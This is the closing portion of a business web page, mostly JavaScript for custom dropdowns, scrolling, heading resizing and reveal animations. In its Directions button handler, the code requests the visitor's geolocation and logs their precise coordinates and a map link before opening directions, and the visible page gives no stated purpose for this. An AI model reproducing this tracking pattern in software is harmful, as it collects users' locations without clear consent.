        if (smooth && typeof scrollHost.scrollTo === 'function') {
            try {
                scrollHost.scrollTo({ top: nextTop, behavior: 'smooth' });
                return;
            } catch (_) {
                // Fallback to immediate assignment for unsupported hosts.
            }
        }
        scrollHost.scrollTop = nextTop;
    }

    function getCustomSelectTargetTop(trigger, scrollHost, topOffset) {
        if (!trigger) return 0;
        if (isDocumentScrollHost(scrollHost)) {
            const triggerRect = trigger.getBoundingClientRect();
            return Math.max(0, Math.round(triggerRect.top + window.pageYOffset - topOffset));
        }

        const hostRect = scrollHost.getBoundingClientRect();
        const triggerRect = trigger.getBoundingClientRect();
        const triggerTopInHost = (triggerRect.top - hostRect.top) + scrollHost.scrollTop;
        return Math.max(0, Math.round(triggerTopInHost - topOffset));
    }

    function smoothScrollHostTo(scrollHost, targetTop) {
        return new Promise((resolve) => {
            const currentTop = getScrollTopForHost(scrollHost);
            if (Math.abs(currentTop - targetTop) <= 1) {
                resolve();
                return;
            }

            setScrollTopForHost(scrollHost, targetTop, true);
            const startedAt = performance.now();
            let lastTop = currentTop;
            let stillFrames = 0;

            const tick = () => {
                const nextTop = getScrollTopForHost(scrollHost);
                if (Math.abs(nextTop - targetTop) <= 2) {
                    resolve();
                    return;
                }

                if (Math.abs(nextTop - lastTop) < 0.25) {
                    stillFrames += 1;
                } else {
                    stillFrames = 0;
                }
                lastTop = nextTop;

                if ((performance.now() - startedAt) > 850 || stillFrames > 9) {
                    resolve();
                    return;
                }

                requestAnimationFrame(tick);
            };

            requestAnimationFrame(tick);
        });
    }

    function alignCustomSelectToTopViewport(selectElement, trigger, options = {}) {
        if (!selectElement || !trigger) return Promise.resolve();
        const scrollHost = findScrollableAncestor(trigger);
        const topOffset = Number.isFinite(options.topOffset) ? options.topOffset : 14;
        const smooth = !!options.smooth;
        const targetTop = getCustomSelectTargetTop(trigger, scrollHost, topOffset);
        const currentTop = getScrollTopForHost(scrollHost);

        if (Math.abs(currentTop - targetTop) <= 1) {
            return Promise.resolve();
        }

        if (!smooth) {
            setScrollTopForHost(scrollHost, targetTop, false);
            return Promise.resolve();
        }

        return smoothScrollHostTo(scrollHost, targetTop);
    }

    function updateCityDropdownOpenHeight(selectElement) {
        if (!selectElement || selectElement.id !== 'cityCustomSelect') return;
        const trigger = selectElement.querySelector('.custom-select__trigger');
        const optionsPanel = selectElement.querySelector('.custom-options');
        if (!trigger || !optionsPanel) return;

        const viewportHeight = window.innerHeight || document.documentElement.clientHeight || 0;
        const triggerRect = trigger.getBoundingClientRect();
        const safeGap = 12;
        const availableBelow = Math.max(120, Math.floor(viewportHeight - triggerRect.bottom - safeGap));
        const fullContentHeight = Math.ceil(optionsPanel.scrollHeight);
        const openHeight = Math.min(fullContentHeight, availableBelow);

        selectElement.style.setProperty('--city-options-open-height', `${Math.max(120, openHeight)}px`);
        optionsPanel.scrollTop = 0;
    }

    function bindCustomSelect(selectId, hiddenInputId) {
        const selectElement = document.getElementById(selectId);
        if (!selectElement || selectElement.dataset.bound === '1') return;

        const trigger = selectElement.querySelector('.custom-select__trigger');
        const options = selectElement.querySelectorAll('.custom-option');
        const wrapper = selectElement.closest('.custom-select-wrapper');
        if (!trigger || !wrapper || !options.length) return;

        selectElement.dataset.bound = '1';
        selectElement.dataset.inputId = hiddenInputId || '';
        const useDeferredOpen = selectId === 'cityCustomSelect';
        let openActionToken = 0;

        trigger.addEventListener('click', async (e) => {
            e.preventDefault();
            trigger.classList.remove('field-invalid');
            const willOpen = !selectElement.classList.contains('open');
            openActionToken += 1;
            const token = openActionToken;
            document.querySelectorAll('.custom-select.open').forEach(openSelect => {
                if (openSelect !== selectElement) openSelect.classList.remove('open');
            });
            if (willOpen) {
                if (useDeferredOpen) {
                    await alignCustomSelectToTopViewport(selectElement, trigger, { smooth: true, topOffset: 12 });
                    if (token !== openActionToken) return;
                    updateCityDropdownOpenHeight(selectElement);
                } else {
                    alignCustomSelectToTopViewport(selectElement, trigger, { smooth: false, topOffset: 14 });
                }
                if (token !== openActionToken) return;
                selectElement.classList.add('open');
            } else {
                selectElement.classList.remove('open');
            }
        });

        options.forEach(option => {
            option.addEventListener('click', () => {
                openActionToken += 1;
                setCustomSelectValue(selectId, option.textContent.trim());
                selectElement.classList.remove('open');
                trigger.classList.remove('field-invalid');
            });
        });

        document.addEventListener('click', (e) => {
            if (!wrapper.contains(e.target)) {
                openActionToken += 1;
                selectElement.classList.remove('open');
            }
        });

        if (useDeferredOpen) {
            const syncCityOptionsHeight = () => {
                if (!selectElement.classList.contains('open')) return;
                updateCityDropdownOpenHeight(selectElement);
            };
            window.addEventListener('resize', syncCityOptionsHeight);
            window.addEventListener('orientationchange', syncCityOptionsHeight);
        }

        const hiddenInput = hiddenInputId ? document.getElementById(hiddenInputId) : null;
        const selectedOption = selectElement.querySelector('.custom-option.selected');
        if (hiddenInput && normalizeSingleLine(hiddenInput.value)) {
            setCustomSelectValue(selectId, hiddenInput.value);
        } else if (selectedOption) {
            setCustomSelectValue(selectId, selectedOption.textContent.trim());
        }
    }

    function initializeCustomSelects() {
        bindCustomSelect('customSelect', 'serviceInput');
        bindCustomSelect('cityCustomSelect', 'cityInput');
        bindCustomSelect('provinceCustomSelect', 'provinceInputMain');
    }

    function adjustDynamicText() {
        const elements = document.querySelectorAll('.dynamic-text');
        elements.forEach(el => {
            el.style.fontSize = ''; // Reset to CSS value
            
            if (el.scrollWidth > el.clientWidth) {
                const style = window.getComputedStyle(el);
                const currentSize = parseFloat(style.fontSize);
                const rootSize = parseFloat(window.getComputedStyle(document.documentElement).fontSize);
                const ratio = el.clientWidth / el.scrollWidth;
                const newRemSize = (currentSize * ratio * 0.95) / rootSize;
                el.style.fontSize = newRemSize + 'rem';
            }
        });

        // Keep hero H1 lines unwrapped on all screens: shrink the block if needed.
        const heroH1 = document.querySelector('.header__description');
        if (!heroH1) return;
        const lines = Array.from(heroH1.querySelectorAll('span'));
        if (!lines.length) return;

        lines.forEach(line => {
            line.style.whiteSpace = 'nowrap';
            line.style.textWrap = 'nowrap';
            line.style.overflowWrap = 'normal';
            line.style.wordBreak = 'keep-all';
        });

        // Reset to CSS-driven size first, then compute a stable pixel fallback for mobile browsers.
        heroH1.style.fontSize = '';
        heroH1.style.setProperty('--h1-fit-scale', '1');
        const baseFontPx = parseFloat(window.getComputedStyle(heroH1).fontSize || '0') || 16;
        const heroStyle = window.getComputedStyle(heroH1);
        const padLeft = parseFloat(heroStyle.paddingLeft || '0') || 0;
        const padRight = parseFloat(heroStyle.paddingRight || '0') || 0;
        const contentWidth = Math.max(1, heroH1.clientWidth - padLeft - padRight);
        // Keep extra breathing room so text never visually touches screen edges.
        const edgeGap = Math.max(8, Math.min(22, contentWidth * 0.04));
        const availableWidth = Math.max(1, contentWidth - (edgeGap * 2));
        if (!availableWidth) return;

        let maxLineWidth = 0;
        lines.forEach(line => {
            maxLineWidth = Math.max(maxLineWidth, line.scrollWidth);
        });
        if (!maxLineWidth) return;

        const ratio = (availableWidth - 2) / maxLineWidth;
        let scale = Math.max(0.22, Math.min(1, ratio));
        heroH1.style.fontSize = `${(baseFontPx * scale).toFixed(3)}px`;

        let postFitMaxWidth = 0;
        lines.forEach(line => {
            postFitMaxWidth = Math.max(postFitMaxWidth, line.scrollWidth);
        });
        if (postFitMaxWidth > availableWidth + 0.5) {
            const correction = availableWidth / postFitMaxWidth;
            scale = Math.max(0.22, scale * correction * 0.99);
        }
        heroH1.style.fontSize = `${(baseFontPx * scale).toFixed(3)}px`;

        // Final safety pass for very narrow screens / browser rounding differences.
        for (let i = 0; i < 3; i++) {
            let overflowWidth = 0;
            lines.forEach(line => {
                overflowWidth = Math.max(overflowWidth, line.scrollWidth);
            });
            if (overflowWidth <= availableWidth + 0.5) break;
            const correction = Math.max(0.6, Math.min(0.99, availableWidth / overflowWidth));
            scale = Math.max(0.22, scale * correction * 0.995);
            heroH1.style.fontSize = `${(baseFontPx * scale).toFixed(3)}px`;
        }
    }

    // (Load listener consolidated above)

    window.addEventListener('resize', adjustDynamicText);
    window.addEventListener('orientationchange', adjustDynamicText);
    if (document.fonts && document.fonts.ready) {
        document.fonts.ready.then(() => adjustDynamicText()).catch(() => {});
    }

    // ------------------------------------------------------------------
    // PERSISTENT TOP/BOTTOM BARS
    // ------------------------------------------------------------------
    (function keepBarsAlwaysVisible() {
        const topBar = document.querySelector('.top-bar');
        const bottomBar = document.querySelector('.bottom-bar');
        if (topBar) topBar.classList.add('top-bar--visible');
        if (bottomBar) bottomBar.classList.add('bottom-bar--visible');
    })();

    // Scroll Fade-in Observer
    // Scroll Fade-in Observer
    var revealObserver;

    function triggerReveal() {
        var revealElements = document.querySelectorAll('.fade-in-section, .blur-in-section, .fade-in-delayed');
        if (!revealElements.length) return;

        if (!revealObserver && window.IntersectionObserver) {
            revealObserver = new IntersectionObserver(function(entries, observerInstance) {
                entries.forEach(function(entry) {
                    if (entry.isIntersecting) {
                        entry.target.classList.remove('is-hidden');
                        entry.target.classList.add('is-visible');
                        observerInstance.unobserve(entry.target);
                    }
                });
            }, {
                root: null,
                rootMargin: '0px 0px 200px 0px',
                threshold: 0
            });
        }

        revealElements.forEach(function(el) {
            // Initial state: hide if not in view
            var rect = el.getBoundingClientRect();
            if (rect.top > window.innerHeight) {
                el.classList.add('is-hidden');
            } else {
                el.classList.add('is-visible');
            }

            if (revealObserver) {
                revealObserver.observe(el);
            }
        });
    }

    // Run trigger
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', triggerReveal);
    } else {
        triggerReveal();
    }
    window.addEventListener('load', triggerReveal);

    // Location static logging
    function openDirectionsTarget(directionsLink) {
        const targetUrl = directionsLink && directionsLink.href ? directionsLink.href : "https://www.google.com/maps/dir//146+Thirtieth+St,+Suite+29,+Toronto,+ON+M8W+3C4";
        if (directionsLink && directionsLink.target === "_blank") {
            const newTab = window.open(targetUrl, "_blank", "noopener,noreferrer");
            if (!newTab) {
                window.location.href = targetUrl;
            }
            return;
        }
        window.location.href = targetUrl;
    }

    function logDirectionsClick(event) {
        const directionsLink = (event && event.currentTarget) ? event.currentTarget : document.getElementById("directionsBtn");

        if (!navigator.geolocation) {
            logEvent("Directions Clicked", "Geolocation is not supported by this browser.", false, "", {
                locationMapUrl: "",
                locationCoords: ""
            });
            openDirectionsTarget(directionsLink);
            return false;
        }

        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = Number(position.coords.latitude).toFixed(6);
                const lng = Number(position.coords.longitude).toFixed(6);
                const locationMapUrl = `https://www.google.com/maps?q=${encodeURIComponent(lat + ',' + lng)}`;
                logEvent("Directions Clicked", `User location captured: ${lat}, ${lng}`, false, "", {
                    locationMapUrl: locationMapUrl,
                    locationCoords: `${lat},${lng}`
                });
                openDirectionsTarget(directionsLink);
            },
            (geoError) => {
                const errorMessage = geoError && geoError.message ? geoError.message : 'Unknown geolocation error';
                logEvent("Directions Clicked", `Geolocation denied/failed: ${errorMessage}`, false, "", {
                    locationMapUrl: "",
                    locationCoords: ""
                });
                openDirectionsTarget(directionsLink);
            },
            {
                enableHighAccuracy: false,
                timeout: 10000,
                maximumAge: 60000
            }
        );

        return false;
    }
</script>

<!-- Month Switch Overlay -->
<div id="monthSwitchOverlay" class="month-switch-overlay" aria-hidden="true">
    <div class="month-switch-overlay__progress" role="status" aria-live="polite" aria-label="Calendar loading progress">
        <div class="month-switch-overlay__bar">
            <div id="monthSwitchProgressFill" class="month-switch-overlay__fill"></div>
        </div>
        <div id="monthSwitchProgressValue" class="month-switch-overlay__percent">0%</div>
    </div>
</div>

<!-- Global Spinner for Finalizing -->
<div id="globalSpinner" class="global-spinner">
    <div class="global-spinner__ring-wrap" aria-label="Loading">
        <svg viewBox="0 0 120 120" class="global-spinner__svg" role="presentation">
            <circle class="global-spinner__track" cx="60" cy="60" r="48"></circle>
            <circle class="global-spinner__glow" cx="60" cy="60" r="48"></circle>
        </svg>
        <div id="globalSpinnerValue" class="global-spinner__value" aria-live="polite">0%</div>
    </div>
</div>

</body>
</html>
